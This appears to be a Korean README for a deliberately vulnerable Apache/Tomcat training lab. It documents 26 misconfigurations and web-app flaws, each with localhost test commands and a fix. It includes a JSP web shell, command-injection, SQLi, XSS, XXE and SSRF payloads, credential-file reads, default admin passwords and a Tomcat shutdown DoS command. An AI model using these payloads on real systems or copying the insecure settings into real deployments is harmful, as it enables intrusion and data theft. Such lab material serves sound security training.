# Apache + Tomcat 보안 취약점 연습 환경

## 구성

| 항목 | 경로 | 포트 |
|------|------|------|
| Apache httpd 2.4.66 | `/home/yuyu/httpd-2.4.66` | 8881 |
| Tomcat 9.0.115 | `/home/yuyu/tomcat` | 8080 (HTTP), 8009 (AJP), 8005 (Shutdown) |
| mod_jk 연동 | `/t1/*`, `/t2/*`, `/vuln/*`, `/manager/*` → AJP worker1 | |
| 취약 웹앱 | `/vuln/` (Tomcat에 배포) | 8080 또는 8881 경유 |

## 프로필 전환

```bash
# 초기값(안전) 적용
cp httpd-2.4.66/conf/profiles/default/httpd.conf httpd-2.4.66/conf/httpd.conf
cp tomcat/conf/profiles/default/server.xml tomcat/conf/server.xml
cp tomcat/conf/profiles/default/tomcat-users.xml tomcat/conf/tomcat-users.xml
cp tomcat/conf/profiles/default/manager-context.xml tomcat/webapps/manager/META-INF/context.xml
cp tomcat/conf/profiles/default/manager-context.xml tomcat/webapps/host-manager/META-INF/context.xml

# 취약 설정 적용
cp httpd-2.4.66/conf/profiles/vulnerable/httpd.conf httpd-2.4.66/conf/httpd.conf
cp tomcat/conf/profiles/vulnerable/server.xml tomcat/conf/server.xml
cp tomcat/conf/profiles/vulnerable/tomcat-users.xml tomcat/conf/tomcat-users.xml
cp tomcat/conf/profiles/vulnerable/manager-context.xml tomcat/webapps/manager/META-INF/context.xml
cp tomcat/conf/profiles/vulnerable/manager-context.xml tomcat/webapps/host-manager/META-INF/context.xml
```

## 서비스 시작/중지

```bash
# 시작
/home/yuyu/tomcat/bin/startup.sh && /home/yuyu/httpd-2.4.66/bin/apachectl start

# 중지
/home/yuyu/httpd-2.4.66/bin/apachectl stop && /home/yuyu/tomcat/bin/shutdown.sh

# Apache만 재시작
/home/yuyu/httpd-2.4.66/bin/apachectl restart
```

---

## 취약점 목록

---

### VULN-01. 디렉터리 리스팅 (Directory Listing)

**설정**: `Options Indexes` (httpd.conf)

**확인 방법**:
```bash
curl http://localhost:8881/secret/
curl http://localhost:8881/upload/
```
→ index.html이 없는 디렉터리에 접근하면 파일 목록이 HTML로 출력됨

**왜 취약한가**:
공격자가 웹 루트 아래의 모든 파일명을 열람할 수 있다. `passwords.txt`, `config.bak`, `.sql` 덤프 등 개발자가 실수로 남겨둔 민감 파일이 그대로 노출된다. 파일 이름만으로도 내부 구조, 사용 기술, 백업 패턴을 추측할 수 있어 후속 공격의 정보 수집(Reconnaissance) 단계에서 매우 유용하다.

**default와 비교**: `Options None` → 디렉터리 접근 시 403 Forbidden 반환

---

### VULN-02. 서버 버전 노출 (Server Banner Disclosure)

**설정**: `ServerTokens Full`, `ServerSignature On` (httpd.conf)

**확인 방법**:
```bash
curl -I http://localhost:8881/
# Server: Apache/2.4.66 (Unix) 같은 전체 버전 헤더 확인

curl http://localhost:8881/nonexistent
# 404 에러 페이지 하단에 서버 버전 + OS 정보 출력
```

**왜 취약한가**:
정확한 버전 번호가 노출되면 공격자가 해당 버전의 알려진 CVE를 즉시 검색하여 exploit을 시도할 수 있다. 예를 들어 Apache 2.4.49의 CVE-2021-41773(Path Traversal)은 버전만 확인하면 바로 공격 가능했다. 버전을 숨기는 것 자체가 방어는 아니지만, 자동화된 스캐닝 도구의 타겟팅을 어렵게 만든다.

**default와 비교**: `ServerTokens Prod` → "Apache"만 출력, `ServerSignature Off` → 에러 페이지에 정보 없음

---

### VULN-03. TRACE 메서드 활성화 (Cross-Site Tracing)

**설정**: `TraceEnable On` (httpd.conf)

**확인 방법**:
```bash
curl -X TRACE http://localhost:8881/
```
→ 요청 헤더가 그대로 응답 본문에 반환됨 (Cookie, Authorization 포함)

**왜 취약한가**:
XSS 취약점과 결합하면 HttpOnly 쿠키를 탈취할 수 있다. HttpOnly 플래그는 JavaScript의 `document.cookie`로 접근을 차단하지만, XHR/fetch로 TRACE 요청을 보내면 서버가 Cookie 헤더를 응답 본문에 포함시켜 돌려주므로 JavaScript에서 읽을 수 있게 된다(XST 공격). 실제 브라우저는 TRACE를 차단하지만 서버 측에서도 비활성화하는 것이 방어 원칙이다.

**default와 비교**: `TraceEnable Off` → TRACE 요청 시 405 Method Not Allowed

---

### VULN-04. 파일시스템 루트 접근 허용

**설정**: `<Directory /> Require all granted` (httpd.conf)

**확인 방법**:
```bash
# 심볼릭 링크 생성 후 접근
ln -s /etc /home/yuyu/httpd-2.4.66/htdocs/etc_link
curl http://localhost:8881/etc_link/passwd
curl http://localhost:8881/etc_link/shadow
```

**왜 취약한가**:
기본 `<Directory />` 설정이 `Require all granted`이면 Apache가 파일시스템의 어떤 경로든 서빙할 수 있다. Alias, SymLink, 잘못된 설정 등으로 DocumentRoot 밖의 경로가 매핑되었을 때 접근을 차단할 마지막 방어선이 사라진다. `/etc/passwd`, `/etc/shadow`, 애플리케이션 소스코드, SSH 키 등이 모두 노출 대상이 된다.

**default와 비교**: `<Directory /> Require all denied` → DocumentRoot 외 경로는 명시적으로 허용하지 않는 한 전부 차단

---

### VULN-05. server-status / server-info 무제한 노출

**설정**: `<Location /server-status> Require all granted` (httpd.conf)

**확인 방법**:
```bash
curl http://localhost:8881/server-status
curl http://localhost:8881/server-info
```
→ server-status: 현재 접속 중인 클라이언트 IP, 요청 URL, worker 상태
→ server-info: 로드된 모든 모듈, 설정 디렉티브 전체 목록

**왜 취약한가**:
server-status는 현재 처리 중인 요청의 클라이언트 IP, URL, 쿼리스트링을 실시간으로 보여준다. 다른 사용자의 세션 토큰이나 API 키가 URL 파라미터에 포함되어 있으면 그대로 노출된다. server-info는 Apache의 모듈 구성과 설정을 전부 보여주므로 공격 표면을 완벽하게 파악할 수 있다.

**default와 비교**: server-status/server-info 모듈 자체를 로드하지 않음

---

### VULN-06. CGI Command Injection

**설정**: `Options ExecCGI`, `AddHandler cgi-script .sh` (httpd.conf)

**확인 방법**:
```bash
curl "http://localhost:8881/cgi-bin/cmd.sh?cmd=id"
curl "http://localhost:8881/cgi-bin/cmd.sh?cmd=cat%20/etc/passwd"
curl "http://localhost:8881/cgi-bin/cmd.sh?cmd=ls%20-la%20/"

# 환경변수 전체 덤프
curl http://localhost:8881/cgi-bin/env.sh
```

**왜 취약한가**:
사용자 입력을 `eval`로 직접 실행하는 CGI 스크립트가 있으면 공격자가 서버에서 임의 명령을 실행할 수 있다(RCE: Remote Code Execution). 웹쉘과 동일한 효과이며, 리버스 쉘 연결, 파일 업로드/다운로드, 내부 네트워크 피봇 등 모든 후속 공격이 가능해진다. OWASP Top 10 A03:2021 (Injection)에 해당.

**default와 비교**: CGI 모듈 미로드, ExecCGI 비활성화

---

### VULN-07. 설정파일/로그 디렉터리 Alias 노출

**설정**: `Alias /conf ...`, `Alias /logs ...` (httpd.conf)

**확인 방법**:
```bash
curl http://localhost:8881/conf/
curl http://localhost:8881/conf/httpd.conf
curl http://localhost:8881/conf/workers.properties
curl http://localhost:8881/logs/
curl http://localhost:8881/logs/access_log
```

**왜 취약한가**:
httpd.conf에는 서버 구조, 모듈, 디렉터리 경로, 보안 설정이 모두 담겨 있다. workers.properties에는 Tomcat AJP 연결 정보(호스트, 포트)가 있다. access_log에는 다른 사용자의 요청 URL(세션 토큰, API 키 포함 가능)이 기록된다. error_log에는 파일 경로, 스택 트레이스 등 내부 구조가 노출된다.

**default와 비교**: Alias 없음. DocumentRoot 밖 디렉터리는 접근 불가

---

### VULN-08. .htaccess / .htpasswd 접근 허용

**설정**: `<Files ".ht*"> Require all granted` (httpd.conf)

**확인 방법**:
```bash
curl http://localhost:8881/.htaccess
curl http://localhost:8881/.htpasswd
```

**왜 취약한가**:
.htaccess에는 인증 설정, 리다이렉트 규칙, 접근 제어 정보가 포함된다. .htpasswd에는 사용자명과 비밀번호 해시가 있으며, 약한 해시(MD5, SHA1)는 hashcat/john으로 쉽게 크래킹된다. 특히 .htpasswd의 비밀번호가 다른 시스템에서도 재사용되는 경우 credential stuffing으로 이어진다.

**default와 비교**: `<Files ".ht*"> Require all denied` → .ht* 파일 접근 시 403

---

### VULN-09. AllowOverride All (htaccess 설정 덮어쓰기)

**설정**: `AllowOverride All` (httpd.conf, 루트 및 DocumentRoot)

**확인 방법**:
```bash
# 공격자가 파일 업로드 취약점으로 .htaccess를 업로드하면:
# 예) AddType application/x-httpd-php .jpg → jpg 파일을 PHP로 실행
# 예) SetHandler server-status → 임의 경로를 핸들러로 매핑
```

**왜 취약한가**:
AllowOverride All이면 .htaccess 파일로 거의 모든 Apache 설정을 디렉터리 단위로 덮어쓸 수 있다. 파일 업로드 취약점과 결합하면 공격자가 .htaccess를 업로드하여 MIME 타입 변경(웹쉘 실행), 접근 제어 무력화, 리다이렉트 조작 등을 수행할 수 있다.

**default와 비교**: `AllowOverride None` → .htaccess 파일 무시

---

### VULN-10. FollowSymLinks

**설정**: `Options FollowSymLinks` (httpd.conf)

**확인 방법**:
```bash
ln -s /etc/passwd /home/yuyu/httpd-2.4.66/htdocs/passwd_link
curl http://localhost:8881/passwd_link

ln -s /home/yuyu/.ssh /home/yuyu/httpd-2.4.66/htdocs/ssh_link
curl http://localhost:8881/ssh_link/
```

**왜 취약한가**:
공격자가 심볼릭 링크를 생성할 수 있으면(CGI, 파일 업로드 등) DocumentRoot 밖의 임의 파일을 읽을 수 있다. `<Directory /> Require all granted`(VULN-04)와 결합하면 파일시스템 전체가 노출된다. SSH 키, 데이터베이스 설정, 다른 사용자의 홈 디렉터리까지 접근 가능.

**default와 비교**: `Options None` → 심볼릭 링크 무시

---

### VULN-11. AllowEncodedSlashes On

**설정**: `AllowEncodedSlashes On` (httpd.conf)

**확인 방법**:
```bash
curl --path-as-is "http://localhost:8881/cgi-bin/cmd.sh?cmd=ls%20%2Fetc"
# %2F가 슬래시로 해석되어 백엔드에 전달됨
```

**왜 취약한가**:
기본적으로 Apache는 URL의 `%2F`(인코딩된 /)를 404로 거부한다. 이를 허용하면 백엔드 애플리케이션이나 프록시가 경로를 해석할 때 보안 필터를 우회할 수 있다. 예를 들어 WAF가 `/admin`을 차단하지만 `/adm%2Fin`은 통과시키는 경우, 또는 백엔드 앱이 이중 디코딩으로 path traversal에 취약한 경우 악용된다.

**default와 비교**: `AllowEncodedSlashes Off` → %2F 포함 요청은 404

---

### VULN-12. Tomcat Manager 무제한 접근 + 약한 비밀번호

**설정**: tomcat-users.xml (admin/admin), manager context.xml에서 RemoteCIDRValve 제거

**확인 방법**:
```bash
# 브라우저에서:
# http://localhost:8080/manager/html (admin / admin)
# http://localhost:8080/host-manager/html (admin / admin)

curl -u admin:admin http://localhost:8080/manager/text/list
curl -u tomcat:tomcat http://localhost:8080/manager/text/list
```

**왜 취약한가**:
Tomcat Manager는 WAR 파일 배포 기능을 제공한다. 공격자가 manager에 접근하면 악성 WAR(웹쉘)을 업로드하여 서버에서 임의 코드를 실행할 수 있다. `admin/admin`, `tomcat/tomcat` 같은 기본/약한 비밀번호는 자동화 도구(hydra, medusa)로 수 초 내에 크래킹된다. IP 제한(RemoteCIDRValve)이 제거되어 어디서든 접근 가능.

**default와 비교**: 계정 없음, RemoteCIDRValve로 127.0.0.1만 허용

---

### VULN-13. Tomcat 브루트포스 방어 없음

**설정**: server.xml에서 LockOutRealm 제거

**확인 방법**:
```bash
# 틀린 비밀번호로 반복 시도해도 잠기지 않음
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}" -u admin:wrong$i http://localhost:8080/manager/html
  echo ""
done
# 계속 401 반환 (잠금 없음)
```

**왜 취약한가**:
LockOutRealm은 일정 횟수 인증 실패 시 해당 계정을 일시 잠금한다. 이것이 없으면 공격자가 무제한으로 비밀번호를 시도할 수 있다. 약한 비밀번호(VULN-12)와 결합하면 사전 공격(dictionary attack)으로 수 분 내에 계정을 탈취할 수 있다.

**default와 비교**: LockOutRealm 적용 → 5회 실패 시 계정 잠금

---

### VULN-14. AJP Connector 무제한 노출 (GhostCat)

**설정**: `address="0.0.0.0"`, `secretRequired="false"`, `allowedRequestAttributesPattern=".*"` (server.xml)

**확인 방법**:
```bash
# AJP 포트 직접 접근 확인
nc -zv localhost 8009

# GhostCat 도구로 테스트 (pyforgot 등)
# python3 ghostcat.py localhost 8009 /WEB-INF/web.xml
```

**왜 취약한가**:
AJP(Apache JServ Protocol)는 바이너리 프로토콜로, HTTP보다 권한이 높다. CVE-2020-1938(GhostCat)은 AJP를 통해 webapp 내 임의 파일을 읽거나, 파일 업로드와 결합하여 RCE를 수행할 수 있는 취약점이다. `secretRequired=false`는 인증 없이 AJP 연결을 허용하고, `address=0.0.0.0`은 외부 네트워크에서도 직접 접근 가능하게 한다. `allowedRequestAttributesPattern=.*`은 AJP 요청의 모든 내부 속성 조작을 허용한다.

**default와 비교**: `address="127.0.0.1"`, `secretRequired="true"`, `secret="your-secret-here"` → 로컬만 허용, 인증 필수

---

### VULN-15. Tomcat Shutdown 포트 노출

**설정**: `<Server port="8005" shutdown="SHUTDOWN">` (server.xml)

**확인 방법**:
```bash
# 이 명령으로 Tomcat을 원격 종료할 수 있음
echo "SHUTDOWN" | nc localhost 8005
```

**왜 취약한가**:
포트 8005에 "SHUTDOWN" 문자열을 보내면 Tomcat이 즉시 종료된다. 공격자가 서버에 네트워크 접근 가능하면 DoS(서비스 거부) 공격을 trivially 수행할 수 있다. 기본 문자열 "SHUTDOWN"은 누구나 알고 있는 값이다.

**default와 비교**: `port="-1"` → shutdown 포트 비활성화

---

### VULN-16. Tomcat 버전/정보 노출

**설정**: `xpoweredBy="true"`, `showServerInfo="true"`, `showReport="true"` (server.xml)

**확인 방법**:
```bash
curl -I http://localhost:8080/
# X-Powered-By: Servlet/4.0 JSP/2.3 ... Apache Tomcat/9.0.115

curl http://localhost:8080/nonexistent
# 에러 페이지에 Tomcat 버전 정보 출력
```

**왜 취약한가**:
VULN-02와 같은 이유. Tomcat 버전이 노출되면 해당 버전의 알려진 취약점(CVE)을 즉시 조회하여 exploit을 시도할 수 있다. showReport=true는 에러 시 상세 스택 트레이스를 노출하여 내부 클래스명, 파일 경로, 라이브러리 버전 등을 알려준다.

**default와 비교**: `xpoweredBy="false"`, `showServerInfo="false"`, `showReport="false"`, `server="Apache"`

---

### VULN-17. Tomcat 예제 앱 활성화

**설정**: `webapps/examples/` 디렉터리 존재

**확인 방법**:
```bash
curl http://localhost:8080/examples/
curl http://localhost:8080/examples/jsp/snp/snoop.jsp
curl http://localhost:8080/examples/servlets/servlet/SessionExample
```

**왜 취약한가**:
examples 앱에는 세션 조작(SessionExample), 요청 헤더 덤프(snoop.jsp), 쿠키 설정 등의 기능이 있다. 공격자가 SessionExample로 임의 세션 속성을 설정하거나, snoop.jsp로 서버 내부 정보(JVM 버전, OS, 클래스패스)를 수집할 수 있다. 프로덕션에 예제 앱을 남겨두는 것은 CIS Benchmark에서 명시적으로 금지하는 항목이다.

**default와 비교**: 프로덕션에서는 `webapps/examples`, `webapps/docs`, `webapps/ROOT` 삭제 권장

---

### VULN-18. Tomcat autoDeploy 활성화

**설정**: `autoDeploy="true"` (server.xml)

**확인 방법**:
```bash
# webapps/ 디렉터리에 WAR를 넣으면 자동 배포됨
cp malicious.war /home/yuyu/tomcat/webapps/
# → 수 초 후 자동으로 압축 해제 및 배포
```

**왜 취약한가**:
autoDeploy가 켜져 있으면 Tomcat이 webapps 디렉터리를 주기적으로 감시하다가 새 WAR 파일이 나타나면 자동 배포한다. 공격자가 파일 쓰기 권한을 얻으면(VULN-06 Command Injection, 파일 업로드 등) 악성 WAR를 넣어 웹쉘을 자동 배포할 수 있다.

**default와 비교**: `autoDeploy="false"` → 수동 배포만 허용

---

## 애플리케이션 레벨 취약점 (vuln-app)

접근: `http://localhost:8080/vuln/` 또는 `http://localhost:8881/vuln/`

---

### VULN-19. Reflected / Stored XSS

**파일**: `vuln-app/xss.jsp`

**확인 방법**:
```
Reflected: http://localhost:8080/vuln/xss.jsp?name=<script>alert('XSS')</script>
Stored:    댓글에 <img src=x onerror=alert(1)> 입력 후 등록
```

**왜 취약한가**:
사용자 입력(`request.getParameter`)을 HTML 이스케이프 없이 `<%=name%>`으로 출력한다. 공격자가 JavaScript를 삽입하면 다른 사용자의 브라우저에서 실행되어 쿠키 탈취, 키로깅, 피싱 페이지 삽입이 가능하다. Stored XSS는 서버에 저장되므로 해당 페이지를 방문하는 모든 사용자가 피해를 입는다. OWASP Top 10 A03:2021 (Injection).

**수정 방법**: JSTL `<c:out>` 또는 `OWASP Java Encoder`의 `Encode.forHtml()` 사용.

---

### VULN-20. SQL Injection

**파일**: `vuln-app/sqli.jsp`

**확인 방법**:
```
전체 조회:   http://localhost:8080/vuln/sqli.jsp?name=' OR '1'='1
패스워드:    http://localhost:8080/vuln/sqli.jsp?name=' UNION SELECT id,name,password,role FROM users--
```

**왜 취약한가**:
`"SELECT ... WHERE name = '" + searchName + "'"` 처럼 문자열 연결로 SQL을 조합하면 공격자가 SQL 구문을 주입하여 인증 우회, 전체 데이터 덤프, 데이터 삭제/변조가 가능하다. UNION 공격으로 다른 테이블(비밀번호, 개인정보)도 조회할 수 있다. 에러 메시지에 SQL 쿼리와 스택 트레이스가 노출되어 공격을 더 쉽게 만든다.

**수정 방법**: `PreparedStatement`와 바인드 변수(`?`) 사용. 에러 메시지에 내부 정보 노출 금지.

---

### VULN-21. 파일 업로드 (Unrestricted File Upload)

**파일**: `vuln-app/upload.jsp`

**확인 방법**:
```
1) shell.jsp 파일 생성:
   <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
2) upload.jsp에서 업로드
3) http://localhost:8080/vuln/uploads/shell.jsp?cmd=id 접근
```

**왜 취약한가**:
확장자, Content-Type, 매직바이트 검증 없이 웹 접근 가능 경로(`/uploads/`)에 원본 파일명으로 저장한다. JSP/WAR 파일을 업로드하면 Tomcat이 서버사이드 코드로 실행하므로 웹쉘이 된다. 파일명에 `../` 를 포함시키면 경로 조작도 가능하다.

**수정 방법**: 확장자 화이트리스트, 파일명 UUID 랜덤화, 웹 접근 불가 경로에 저장, Content-Type + 매직바이트 이중 검증.

---

### VULN-22. Local File Inclusion (LFI)

**파일**: `vuln-app/lfi.jsp`

**확인 방법**:
```
http://localhost:8080/vuln/lfi.jsp?page=/etc/passwd
http://localhost:8080/vuln/lfi.jsp?page=/home/yuyu/tomcat/conf/tomcat-users.xml
```

**왜 취약한가**:
사용자 입력을 `Files.readAllBytes(Paths.get(page))`에 그대로 전달한다. 경로 검증이 없으므로 서버의 모든 파일을 읽을 수 있다. tomcat-users.xml을 읽으면 Manager 비밀번호를 획득하고, SSH 키를 읽으면 서버에 직접 접속할 수 있다.

**수정 방법**: 화이트리스트 매핑, 또는 `Path.toRealPath()` 후 기준 디렉터리 내인지 `startsWith()` 검증.

---

### VULN-23. SSRF (Server-Side Request Forgery)

**파일**: `vuln-app/ssrf.jsp`

**확인 방법**:
```
http://localhost:8080/vuln/ssrf.jsp?url=http://localhost:8080/manager/html
http://localhost:8080/vuln/ssrf.jsp?url=file:///etc/passwd
http://localhost:8080/vuln/ssrf.jsp?url=http://169.254.169.254/latest/meta-data/
```

**왜 취약한가**:
서버가 사용자 지정 URL을 그대로 요청한다. 공격자가 내부망 서비스(DB, Redis, 관리 콘솔), 클라우드 메타데이터(AWS IAM 자격증명), `file://` 프로토콜로 로컬 파일에 접근할 수 있다. 방화벽이 외부→내부를 차단해도 서버가 내부에서 요청하므로 우회된다.

**수정 방법**: URL 화이트리스트, 내부 IP 대역 차단, 프로토콜 제한(http/https만), DNS rebinding 방지.

---

### VULN-24. OS Command Injection (JSP)

**파일**: `vuln-app/cmd.jsp`

**확인 방법**:
```
POST cmd=id
POST cmd=id; cat /etc/passwd
POST cmd=cat /etc/passwd | grep root
```

**왜 취약한가**:
`Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd})`로 사용자 입력을 쉘에 전달한다. `;`, `|`, `&&` 등 메타문자로 명령을 체이닝할 수 있어 임의 명령 실행(RCE)이 가능하다. 리버스 쉘로 완전한 서버 장악까지 이어진다.

**수정 방법**: 명령 실행 자체를 제거. 불가피하면 ProcessBuilder에 인자를 배열로 전달하여 쉘 해석 방지.

---

### VULN-25. Session Info Leak / Session Fixation

**파일**: `vuln-app/session.jsp`

**확인 방법**:
```
http://localhost:8080/vuln/session.jsp
→ 세션 ID, 생성 시간, 속성이 모두 노출됨

http://localhost:8080/vuln/session.jsp?key=role&value=admin
→ 세션 속성 임의 조작
```

**왜 취약한가**:
세션 ID가 페이지에 노출되어 공격자가 세션 하이재킹에 활용할 수 있다. 세션 속성을 파라미터로 조작할 수 있어 권한 상승이 가능하다. 세션 고정 공격 시 로그인 전후 세션 ID가 변경되지 않으면 공격자의 세션을 피해자가 그대로 사용하게 된다.

**수정 방법**: 세션 정보 페이지 제거 또는 인증 필수. 로그인 시 `request.changeSessionId()`. 쿠키에 HttpOnly/Secure/SameSite.

---

### VULN-26. XXE (XML External Entity)

**파일**: `vuln-app/xxe.jsp`

**확인 방법**:
```xml
POST로 아래 XML 전송:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**왜 취약한가**:
`DocumentBuilderFactory`의 기본 설정은 외부 엔티티를 처리한다. 공격자가 `SYSTEM` 엔티티로 서버의 로컬 파일을 읽거나, HTTP 엔티티로 내부망에 SSRF 요청을 보낼 수 있다. Billion Laughs 공격으로 DoS도 가능하다. OWASP Top 10 A05:2017에서 단독 카테고리였을 정도로 심각한 취약점.

**수정 방법**: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 등으로 외부 엔티티 비활성화.
